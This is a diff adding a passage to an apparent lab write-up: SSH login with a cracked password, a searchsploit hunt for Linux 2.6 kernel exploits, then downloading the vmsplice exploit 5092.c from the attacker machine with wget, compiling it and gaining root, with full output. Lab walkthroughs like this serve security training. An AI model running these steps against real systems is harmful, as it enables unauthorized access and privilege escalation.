@@ -189,9 +189,92 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
+yes we have vmware user password now and we can SSH to the server :
 
+```bash
+root@kali: ssh vmware@192.168.127.138
 
+vmware@192.168.127.138's password: 
+Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
 
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+Last login: Sun Sep 10 02:07:37 2023 from 192.168.127.128
+vmware@ubuntuvm:~$
+```
+
+## 4.Privilege Escalation
+
+We check the kernel version of the system :
+
+```bash
+vmware@ubuntuvm:/home$ uname -a
+Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
+```
+
+this an old kernel we search for any exploit for it :
+
+```bash
+vmware@ubuntuvm:/home$ searchsploit kernel 2.6 | grep -i escalation
+
+Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local Privilege Escalation (2)                                                | linux/local/5092.c
+Linux Kernel 2.6.17.4 - 'proc' Local Privilege Escalation                                                                 | linux/local/2013.c
+Linux Kernel 2.6.18 < 2.6.18-20 - Local Privilege Escalation                                                              | linux/local/10613.c
+Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                         | linux/local/50135.c
+Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)        | linux/local/40616.c
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)           | linux/local/40847.cpp
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)        | linux/local/40839.c
+```
+
+after trying some exploit and not working i tried the `linux/local/5092.c` exploit on the victim.
+
+just upload the exploit on the victim and compile it :
+
+```text
+vmware@ubuntuvm:/tmp$ wget http://192.168.127.128/5092.c                                                                                                   
+--02:16:10--  http://192.168.127.128/5092.c
+           => `5092.c'
+Connecting to 192.168.127.128:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6,288 (6.1K) [text/x-csrc]
+
+100%[================================================================================================================>] 6,288         --.--K/s             
+
+02:16:10 (573.83 KB/s) - `5092.c' saved [6288/6288]
+
+vmware@ubuntuvm:/tmp$ ls
+5092.c  sqlmrnmih
+
+vmware@ubuntuvm:/tmp$ gcc 5092.c 
+5092.c:289:28: warning: no newline at end of file
+
+vmware@ubuntuvm:/tmp$ ls
+5092.c  a.out  sqlmrnmih
+
+vmware@ubuntuvm:/tmp$ ./a.out 
+-----------------------------------
+ Linux vmsplice Local Root Exploit
+ By qaaz
+-----------------------------------
+[+] mmap: 0x0 .. 0x1000
+[+] page: 0x0
+[+] page: 0x20
+[+] mmap: 0x4000 .. 0x5000
+[+] page: 0x4000
+[+] page: 0x4020
+[+] mmap: 0x1000 .. 0x2000
+[+] page: 0x1000
+[+] mmap: 0xb7e57000 .. 0xb7e89000
+[+] root
+root@ubuntuvm:/tmp# id
+uid=0(root) gid=0(root) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)
+
+root@ubuntuvm:/tmp# 
+```
 
 
 
